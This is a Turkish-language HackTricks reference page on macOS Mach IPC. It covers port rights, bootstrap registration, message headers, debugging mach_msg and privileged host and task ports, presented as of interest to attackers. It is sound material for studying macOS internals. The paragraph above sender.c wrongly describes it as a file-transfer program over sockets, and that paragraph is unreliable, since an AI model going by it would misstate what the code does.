# macOS IPC - İşlem Arası İletişim

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitimi AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitimi GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin**.
* **Hacking püf noktalarını göndererek HackTricks ve HackTricks Cloud** github depolarına PR göndererek paylaşın.

</details>
{% endhint %}

## Portlar Aracılığıyla Mach Mesajlaşması

### Temel Bilgiler

Mach, kaynakları paylaşmak için **görevleri** en **küçük birim** olarak kullanır ve her görev **çoklu iş parçacığı** içerebilir. Bu **görevler ve iş parçacıkları POSIX işlemlerine ve iş parçacıklarına 1:1 eşlenir**.

Görevler arasındaki iletişim, Mach İşlem Arası İletişim (IPC) aracılığıyla gerçekleşir ve tek yönlü iletişim kanallarını kullanır. **Mesajlar portlar arasında aktarılır**, bu portlar çekirdek tarafından yönetilen bir tür **mesaj kuyruğu** gibi davranır.

Bir **port**, Mach IPC'nin temel öğesidir. Bu, **mesaj göndermek ve almak** için kullanılabilir.

Her işlemde bir **IPC tablosu** bulunur, burada işlemin **mach portları** bulunabilir. Bir mach portun adı aslında bir sayıdır (çekirdek nesnesine işaret eden bir işaretçi).

Bir işlem ayrıca bir port adını bazı haklarla **farklı bir göreve gönderebilir** ve çekirdek bu girişi **diğer görevin IPC tablosuna ekler**.

### Port Hakları

İletişimde önemli olan port hakları, bir görevin yapabileceği işlemleri tanımlar. Mümkün olan **port hakları** şunlardır ([buradan tanımlamalar](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **Alma hakkı**, porta gönderilen mesajları almayı sağlar. Mach portları MPSC (çoklu üretici, tek tüketici) kuyruklarıdır, bu da demektir ki tüm sistemde bir port için yalnızca **bir alma hakkı olabilir** (borular gibi, burada birden fazla işlem, aynı borunun okuma ucuna ait dosya tanımlayıcılarına sahip olabilir).
* **Alma hakkına sahip bir görev**, mesajları alabilir ve **Gönderme hakları oluşturabilir**, böylece mesaj gönderebilir. Başlangıçta yalnızca **kendi görevi, portun üzerinde Alma hakkına sahiptir**.
* Alma hakkının sahibi **öldüğünde** veya onu sonlandırdığında, **gönderme hakkı işlevsiz hale gelir (ölü ad)**.
* **Gönderme hakkı**, porta mesaj göndermeyi sağlar.
* Gönderme hakkı **kopyalanabilir**, böylece Gönderme hakkına sahip bir görev, hakkı kopyalayabilir ve **üçüncü bir göreve verilebilir**.
* **Port hakları** ayrıca Mac mesajları aracılığıyla da **geçirilebilir**.
* **Bir kez gönderme hakkı**, porta bir mesaj göndermeyi ve ardından kaybolmayı sağlar.
* Bu hak **kopyalanamaz**, ancak **taşınabilir**.
* **Port kümesi hakkı**, yalnızca tek bir port değil bir _port kümesini_ belirtir. Bir port kümesinden bir mesaj çıkarmak, içerdiği portlardan birinden bir mesaj çıkarır. Port kümeleri, Unix'teki `select`/`poll`/`epoll`/`kqueue` gibi aynı anda birkaç porta dinlemek için kullanılabilir.
* **Ölü ad**, gerçek bir port hakkı değil, yalnızca bir yer tutucudur. Bir port yok edildiğinde, portun tüm mevcut port hakları ölü adlara dönüşür.

**Görevler, SEND haklarını başkalarına aktarabilir**, böylece onlara geri mesaj gönderme yetkisi verilebilir. **SEND hakları da klonlanabilir**, böylece bir görev hakkı çoğaltabilir ve üçüncü bir göreve verebilir. Bu, **aracı bir süreç olan başlangıç sunucusu** ile birlikte, görevler arasında etkili iletişim sağlar.

### Dosya Portları

Dosya portları, dosya tanımlayıcılarını Mac portlarına (Mach port hakları kullanarak) kapsüllüyebilir. Belirli bir FD'den `fileport_makeport` kullanarak bir `fileport` oluşturmak ve bir FD oluşturmak mümkündür.

### İletişim Kurma

Daha önce belirtildiği gibi, Mach mesajları aracılığıyla hakları göndermek mümkündür, ancak **zaten bir Mach mesajı gönderme hakkına sahip olmadan bir hakkı gönderemezsiniz**. Peki, ilk iletişim nasıl kurulur?

Bu durumda, **başlangıç sunucusu** (**mac**'de **launchd**) devreye girer, çünkü **herkes başlangıç sunucusuna bir SEND hakkı alabilir**, böylece başka bir işleme mesaj göndermek için bir hakkı istemek mümkündür:

1. Görev **A**, **ALMA hakkı** alarak yeni bir **port oluşturur**.
2. ALMA hakkının sahibi olan Görev **A**, port için bir **GÖNDERME hakkı oluşturur**.
3. Görev **A**, **başlangıç sunucusu** ile bir **bağlantı kurar** ve başlangıçta oluşturduğu porta ait **GÖNDERME hakkını sunucuya gönderir**.
* Unutmayın ki herkes başlangıç sunucusuna bir GÖNDERME hakkı alabilir.
4. Görev A, başlangıç sunucusuna bir `bootstrap_register` mesajı göndererek verilen portu `com.apple.taska` gibi bir **isimle ilişkilendirir**.
5. Görev **B**, hizmet adı için bir başlangıç **araması yapmak üzere başlangıç sunucusu** ile etkileşime girer (`bootstrap_lookup`). Sunucu yanıt verebilsin diye, görev B, arama mesajı içinde önceden oluşturduğu bir **port için bir GÖNDERME hakkı gönderir**. Arama başarılıysa, **sunucu Task A'dan aldığı GÖNDERME hakkını kopyalar ve Task B'ye iletir**.
* Unutmayın ki herkes başlangıç sunucusuna bir GÖNDERME hakkı alabilir.
6. Bu GÖNDERME hakkı ile **Görev B**, **Görev A'ya bir mesaj gönderebilir**.
7. İki yönlü iletişim için genellikle görev **B**, bir **ALMA** hakkı ve bir **GÖNDERME** hakkı olan yeni bir port oluşturur ve **Görev A'ya GÖNDERME hakkını verir**, böylece Görev A, GÖREV B'ye mesaj gönderebilir (iki yönlü iletişim).

Başlangıç sunucusu **hizmet adını doğrulayamaz**. Bu, bir **görevin** potansiyel olarak **herhangi bir sistem görevini taklit edebileceği** anlamına gelir, örneğin yanlışlıkla **bir yetkilendirme hizmet adı iddia edebilir** ve ardından her isteği onaylayabilir.

Daha sonra, Apple, **sistem tarafından sağlanan hizmetlerin adlarını** güvenli yapılandırma dosyalarında saklar, bu dosyalar **SIP korumalı** dizinlerde bulunur: `/System/Library/LaunchDaemons` ve `/System/Library/LaunchAgents`. Her hizmet adının yanında, **ilişkili ikili dosya da saklanır**. Başlangıç sunucusu, bu hizmet adları için her biri için bir **ALMA hakkı oluşturur ve saklar**.

Bu önceden tanımlanmış hizmetler için, **arama süreci biraz farklıdır**. Bir hizmet adı aranırken, launchd hizmeti dinamik olarak başlatır. Yeni iş akışı şöyle işler:

* Görev **B**, bir hizmet adı için bir başlangıç **araması başlatır**.
* **launchd**, görevin çalışıp çalışmadığını kontrol eder ve çalışmıyorsa, **başlatır**.
* Görev **A** (hizmet), bir **başlangıç kontrolü yapar** (`bootstrap_check_in()`). Burada, **başlangıç sunucusu bir GÖNDERME hakkı oluşturur, saklar ve ALMA hakkını Görev A'ya aktarır**.
* launchd, **GÖNDERME hakkını kopyalar ve Görev B'ye iletir**.
* Görev **B**, bir **ALMA** hakkı ve bir **GÖNDERME** hakkı olan yeni bir port oluşturur ve **Görev A'ya GÖNDERME hakkını verir** (hizmet), böylece Görev A, GÖREV B'ye mesaj gönderebilir (iki yönlü iletişim).

Ancak, bu süreç yalnızca önceden tanımlanmış sistem görevleri için geçerlidir. Sistem dışı görevler hala önceki şekilde çalışır, bu da potansiyel olarak taklit edilmesine izin verebilir.

{% hint style="danger" %}
Bu nedenle, launchd asla çökmemeli veya tüm sistem çökecektir.
{% endhint %}
### Bir Mach İletisi

[Daha fazla bilgiyi burada bulabilirsiniz](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

`mach_msg` işlevi, temelde bir sistem çağrısı olup Mach iletilerini göndermek ve almak için kullanılır. İşlev, iletilmesi gereken iletiyi başlangıç argümanı olarak gerektirir. Bu ileti, bir `mach_msg_header_t` yapısı ile başlamalı ve ardından gerçek ileti içeriği gelmelidir. Yapı aşağıdaki gibi tanımlanmıştır:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
İşlemciler, bir Mach bağlantı noktasında ileti almak için bir _**alma hakkına**_ sahip olabilirler. Tersine, **gönderenler** bir _**gönderme**_ veya _**bir kez gönderme hakkına**_ sahiptir. Bir kez gönderme hakkı yalnızca bir ileti göndermek için kullanılır, ardından geçersiz hale gelir.

Başlangıç alanı **`msgh_bits`** bir bit eşlemidir:

- İlk bit (en anlamlı) bir ileti'nin karmaşık olduğunu belirtmek için kullanılır (aşağıda daha fazla bilgi)
- 3. ve 4. bitler çekirdek tarafından kullanılır
- 2. baytın **en az 5 anlamlı bitsi** **makbuz** için kullanılabilir: anahtar/değer kombinasyonları göndermek için başka bir bağlantı nokta türü.
- 3. baytın **en az 5 anlamlı bitsi** **yerel bağlantı noktası** için kullanılabilir
- 4. baytın **en az 5 anlamlı bitsi** **uzak bağlantı noktası** için kullanılabilir

Makbuzda, yerel ve uzak bağlantı noktalarında belirtilebilecek türler [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) adresinden alınabilir:
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Örneğin, `MACH_MSG_TYPE_MAKE_SEND_ONCE`, bu bağlantı noktası için türetilmiş ve aktarılmış bir **tek seferlik gönderme hakkının** belirtildiğini **belirtmek** için kullanılabilir. Alıcı yanıt veremez şeklinde alıcının yanıt vermesini engellemek için de `MACH_PORT_NULL` belirtilebilir.

Kolay **iki yönlü iletişim** sağlamak için bir işlem, _yanıt bağlantı noktası_ (**`msgh_local_port`** olarak adlandırılan) olarak adlandırılan bir mach **mesaj başlığı** içinde bir **mach bağlantı noktası** belirtebilir, mesajın alıcısı bu mesaja yanıt gönderebilir.

{% hint style="success" %}
Bu tür iki yönlü iletişimin XPC mesajlarında kullanıldığını unutmayın (`xpc_connection_send_message_with_reply` ve `xpc_connection_send_message_with_reply_sync`). Ancak genellikle farklı bağlantı noktaları oluşturulur, önceki açıklamalarda açıklandığı gibi iki yönlü iletişimi oluşturmak için.
{% endhint %}

Mesaj başlığının diğer alanları şunlardır:

- `msgh_size`: tüm paketin boyutu.
- `msgh_remote_port`: bu mesajın gönderildiği bağlantı noktası.
- `msgh_voucher_port`: [mach fişleri](https://robert.sesek.com/2023/6/mach\_vouchers.html).
- `msgh_id`: bu mesajın kimliği, alıcı tarafından yorumlanır.

{% hint style="danger" %}
**Mach mesajları**, mach çekirdeğine yerleştirilmiş **tek alıcı**, **çoklu gönderen** iletişim kanalı olan bir **mach bağlantı noktası** üzerinden gönderilir. **Birden fazla işlem**, bir mach bağlantı noktasına **mesaj gönderebilir**, ancak herhangi bir anda yalnızca **bir işlem** ondan okuyabilir.
{% endhint %}

Mesajlar daha sonra **`mach_msg_header_t`** başlık ile başlar, ardından **gövde** ve **trailer** (varsa) gelir ve yanıt verme izni verebilir. Bu durumlarda, çekirdek sadece mesajı bir görevden diğerine iletmelidir.

Bir **trailer**, **kullanıcı tarafından ayarlanamayan** mesaja çekirdek tarafından eklenen bilgidir ve alıcıdan bu bilgiyi talep etmek için `MACH_RCV_TRAILER_<trailer_opt>` bayrakları kullanılır (talep edilebilecek farklı bilgiler vardır).

#### Karmaşık Mesajlar

Ancak, ek port hakları geçiren veya belleği paylaşan daha **karmaşık** mesajlar gibi diğer mesajlar da vardır, bu durumlarda çekirdek bu nesneleri alıcıya göndermek zorundadır. Bu durumlarda, başlık `msgh_bits`'in en anlamlı biti ayarlanır.

Geçirilebilecek olası tanımlayıcılar [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) içinde tanımlanmıştır.
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
### Mac Port API'leri

Portlar görev ad alanına bağlı olduğundan, bir port oluşturmak veya aramak için görev ad alanı da sorgulanır (daha fazlası için `mach/mach_port.h`):

- **`mach_port_allocate` | `mach_port_construct`**: Bir port **oluşturur**.
- `mach_port_allocate` ayrıca bir **port seti** oluşturabilir: bir grup port üzerinde alınan hak. Bir mesaj alındığında, mesajın nereden geldiği belirtilir.
- `mach_port_allocate_name`: Portun adını değiştirir (varsayılan olarak 32 bitlik tamsayı)
- `mach_port_names`: Bir hedeften port adlarını alır
- `mach_port_type`: Bir görevin bir ada sahip olma haklarını alır
- `mach_port_rename`: Bir portun adını değiştirir (FD'ler için dup2 gibi)
- `mach_port_allocate`: YENİ ALMA, PORT\_SET veya DEAD\_NAME oluşturur
- `mach_port_insert_right`: ALMA hakkına sahip olduğunuz bir portta yeni bir hak oluşturur
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: Mach mesajları **göndermek ve almak** için kullanılan işlevler. Üzerine yazma sürümü, mesaj alımı için farklı bir tampon belirtmeyi sağlar (diğer sürüm sadece onu yeniden kullanır).

### Debug mach\_msg

`mach_msg` ve `mach_msg_overwrite` işlevlerinin gönderme ve alma işlemlerinde kullanıldığı için bunlara bir kesme noktası ayarlamak gönderilen ve alınan mesajları incelemeyi sağlar.

Örneğin, bu işlevi kullanan **`libSystem.B`'yi yükleyecek herhangi bir uygulamayı hata ayıklamaya başlayın**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Kesme Noktası 1: nerede = libsystem_kernel.dylib`mach_msg, adres = 0x00000001803f6c20
<strong>(lldb) r
</strong>İşlem 71019 başlatıldı: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
İşlem 71019 durdu
* thread #1, queue = 'com.apple.main-thread', duraklama nedeni = kesme noktası 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 &#x3C;+0>:  pacibsp
0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
Hedef 0: (SandboxedShellApp) durdu.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', duraklama nedeni = kesme noktası 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
</code></pre>

**`mach_msg`**'nin argümanlarını almak için kayıtları kontrol edin. Bu argümanlar şunlardır ([mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) adresinden):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Kayıtlardan değerleri alın:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
İlk argümanı kontrol ederek mesaj başlığını inceleyin:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
O tür `mach_msg_bits_t`, bir yanıtı izin vermek için çok yaygındır.



### Bağlantı noktalarını sırala
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**İsim**, bağlantı noktasına verilen varsayılan addır (ilk 3 baytın nasıl **arttığını** kontrol edin). **`ipc-object`** ise bağlantı noktasının **şifrelenmiş** benzersiz **tanımlayıcısıdır**.\
Ayrıca, yalnızca **`send`** hakkına sahip bağlantı noktalarının sahibini belirlediğine dikkat edin (bağlantı noktası adı + pid).\
Ayrıca, **diğer görevleri belirtmek** için **`+`** işaretinin kullanımına dikkat edin.

Ayrıca, [**procesxp**](https://www.newosxbook.com/tools/procexp.html) kullanarak **kayıtlı hizmet adlarını** (SIP devre dışı bırakıldığında `com.apple.system-task-port` gerektiğinden) görmek mümkündür:
```
procesp 1 ports
```
iOS'ta bu aracı indirerek yükleyebilirsiniz [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Kod örneği

**Gönderici**nin nasıl bir bağlantı noktası **ayırdığını**, `org.darlinghq.example` adı için bir **gönderme hakkı** oluşturduğunu ve bunu **önyükleme sunucusuna** gönderdiğini, göndericinin o ad için **gönderme hakkını** istediğini ve bunu kullanarak bir **mesaj gönderdiğini** görebilirsiniz.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}Dosya gönderme işlemi için kullanılan C programı. Bu program, alıcıya bir dosya göndermek için IPC soketlerini kullanır. Bu, iki işlem arasında iletişim kurmak için kullanılan bir yöntemdir. Bu program, dosya adını ve boyutunu alıcıya gönderir ve ardından dosyanın içeriğini gönderir. Bu işlem, dosya gönderme işlemini gerçekleştirmek için alıcı programla birlikte çalışır.{% endtab %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

## Ayrıcalıklı Bağlantı Noktaları

Belirli hassas eylemleri gerçekleştirmeye veya belirli hassas verilere erişmeye izin veren bazı özel bağlantı noktaları vardır, bir görevin üzerlerinde **GÖNDERME** izinlerine sahip olması durumunda. Bu, bu bağlantı noktalarını saldırganlar açısından çok ilginç kılar, sadece yeteneklerinden değil, aynı zamanda **GÖNDERME izinlerinin görevler arasında paylaşılabilir** olmasından dolayı.

### Ana Bilgisayar Özel Bağlantı Noktaları

Bu bağlantı noktaları bir numara ile temsil edilir.

**GÖNDERME** hakları, **`host_get_special_port`** çağrısı ile elde edilebilir ve **ALMA** hakları **`host_set_special_port`** çağrısı ile elde edilebilir. Ancak, her iki çağrı da yalnızca kökün erişebileceği **`host_priv`** bağlantı noktasını gerektirir. Ayrıca, geçmişte kök, örneğin `HOST_KEXTD_PORT`'u ele geçirerek kod imzalarını atlayarak izin veren keyfi bağlantı noktalarını ele geçirebiliyordu (SIP şimdi buna engel oluyor).

Bunlar 2 gruba ayrılır: **İlk 7 bağlantı noktası çekirdek tarafından sahiplenilir**; 1 `HOST_PORT`, 2 `HOST_PRIV_PORT`, 3 `HOST_IO_MASTER_PORT` ve 7 `HOST_MAX_SPECIAL_KERNEL_PORT`'dur.\
**8'den** başlayanlar ise **sistem hizmetlileri tarafından sahiplenilir** ve [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host\_special\_ports.h.auto.html) dosyasında tanımlanmıştır.

* **Ana bilgisayar bağlantı noktası**: Bir işlem bu bağlantı noktası üzerinde **GÖNDERME** ayrıcalığına sahipse, sistem hakkında bilgi alabilir ve aşağıdaki rutinlerini çağırarak işlemlerini gerçekleştirebilir:
* `host_processor_info`: İşlemci bilgilerini al
* `host_info`: Ana bilgisayar bilgilerini al
* `host_virtual_physical_table_info`: Sanal/Fiziksel sayfa tablosu (MACH\_VMDEBUG gerektirir)
* `host_statistics`: Ana bilgisayar istatistiklerini al
* `mach_memory_info`: Çekirdek bellek düzenini al
* **Ana bilgisayar Ayrıcalıklı bağlantı noktası**: Bu bağlantı noktası üzerinde **GÖNDERME** hakkı olan bir işlem, örneğin önyükleme verilerini gösterme veya bir çekirdek uzantısını yükleme gibi **ayrıcalıklı eylemler gerçekleştirebilir**. Bu izne sahip olmak için **işlemin kök olması** gerekir.
* Ayrıca, **`kext_request`** API'sını çağırmak için yalnızca Apple ikililerine verilen **`com.apple.private.kext*`** diğer ayrıcalıklara ihtiyaç vardır.
* Çağrılabilen diğer rutinler şunlardır:
* `host_get_boot_info`: `machine_boot_info()`'yu al
* `host_priv_statistics`: Ayrıcalıklı istatistikleri al
* `vm_allocate_cpm`: Ardışık Fiziksel Bellek Ayır
* `host_processors`: İşlemcilere gönderme hakkı
* `mach_vm_wire`: Belleği yerleşik yap
* **Kök** bu izne erişebildiği için, `host_set_[special/exception]_port[s]`'ı çağırarak **ana bilgisayar özel veya istisna bağlantı noktalarını ele geçirebilir**.

Tüm ana bilgisayar özel bağlantı noktalarını görmek mümkündür:
```bash
procexp all ports | grep "HSP"
```
### Görev Özel Portları

Bunlar, tanınmış hizmetler için ayrılmış portlardır. Onları `task_[get/set]_special_port` çağırarak almak/ayarlamak mümkündür. Onlar `task_special_ports.h` dosyasında bulunabilir:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
[Buradan](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html):

* **TASK\_KERNEL\_PORT**\[görev-kendisi gönderme hakkı]: Bu görevi kontrol etmek için kullanılan bağlantı noktası. Görevi etkileyen mesajları göndermek için kullanılır. Bu, **mach\_task\_self (aşağıdaki Görev Bağlantı Noktaları'na bakınız)** tarafından döndürülen bağlantı noktasıdır.
* **TASK\_BOOTSTRAP\_PORT**\[başlatma gönderme hakkı]: Görevin başlatma bağlantı noktası. Diğer sistem hizmeti bağlantı noktalarının geri dönüşünü istemek için mesaj göndermek için kullanılır.
* **TASK\_HOST\_NAME\_PORT**\[ana-gönderme hakkı]: İçeren ana bilgisayarın bilgilerini istemek için kullanılan bağlantı noktası. Bu, **mach\_host\_self** tarafından döndürülen bağlantı noktasıdır.
* **TASK\_WIRED\_LEDGER\_PORT**\[defter gönderme hakkı]: Bu görevin kablolu çekirdek belleğini çektiği kaynağı adlandıran bağlantı noktası.
